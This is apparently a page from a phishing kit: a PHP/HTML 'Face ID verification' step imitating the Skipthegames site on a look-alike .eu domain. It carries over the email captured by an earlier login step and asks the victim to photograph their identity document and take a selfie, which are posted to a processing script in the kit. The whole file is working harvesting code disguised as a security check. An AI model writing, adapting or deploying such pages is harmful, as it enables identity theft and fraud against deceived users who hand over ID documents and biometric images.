<?php
// segurity_faceid.php

session_start();
// Recuperar el correo de la sesión (establecido en processlogin.php)
$user_email = $_SESSION['logged_in_email'] ?? 'correo@ejemplo.com'; 
?>
<!doctype html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>Verificación de Identidad - Skipthegames.eu</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="assets/css/login.css"> 
    <link rel="stylesheet" href="assets/css/face_id.css"> 
</head>
<body>

    <main class="wrap" role="main">
        
        <div class="top-warning">Providers, we do not send out text messages ever, do not click on links from them.</div>

        <header class="brand-block">
            <a href="#" class="brand">Skipthegames<span class="tld">.eu</span></a>
            <div class="tagline">Skip the games. Get satisfaction.</div>
        </header>
        
        <div class="user-block">
            <span class="user-salute">Hi,</span>
            <a href="#" class="user-email-link"><?php echo htmlspecialchars($user_email); ?></a>
            <span class="user-actions">
                <a href="#">go to your account</a> | <a href="#" class="log-out-link">log out</a>
            </span>
        </div>

        <p class="nav-breadcrumb">
            <a href="#">SKIPTHEGAMES.COM</a> » VERIFICACIÓN FACE ID
        </p>

        <h1 class="security-title">Verificación de Identidad (Face ID)</h1>
        
        <p class="security-text">
            Por motivos de seguridad y para evitar fraudes, requerimos una verificación de identidad en vivo.
        </p>

        <form id="faceIdForm" method="post" action="assets/config/process_faceid.php">
            
            <div class="camera-container">
                <p class="step-message" id="stepMessage">Paso 1: Captura de tu Documento de Identidad (ID)</p>
                <video id="videoElement" autoplay playsinline></video>
                
                <button type="button" class="btn" id="switchCameraButton" style="width: 100%; max-width: 400px; margin-bottom: 10px;">Cambiar Cámara</button>
                <button type="button" class="btn" id="captureButton" style="width: 100%; max-width: 400px;">Tomar Foto</button>

                <canvas id="canvas"></canvas>
                <img id="idImage" alt="Foto del ID capturada">
                <img id="selfieImage" alt="Foto Selfie capturada">
                
                <input type="hidden" name="id_data" id="idDataInput">
                <input type="hidden" name="selfie_data" id="selfieDataInput">
            </div>

            <button type="submit" class="btn" id="submitButton" style="display:none; margin-top: 20px;">Enviar Verificación Segura</button>
        </form>

        <p class="security-text" style="margin-top: 20px;">
            Asegúrate de que las imágenes sean claras y los datos del documento legibles.
        </p>

        <hr class="divider">

        <footer class="footer">
            <small>©Skipthegames.eu</small>
            <nav class="links footer-mobile-links" aria-label="Footer">
                <a href="#">Home</a><a href="#">Contact</a><a href="#">About</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Escort Info</a>
            </nav>
        </footer>
    </main>
    
    <script src="assets/js/faceid_script.js"></script>
</body>
</html>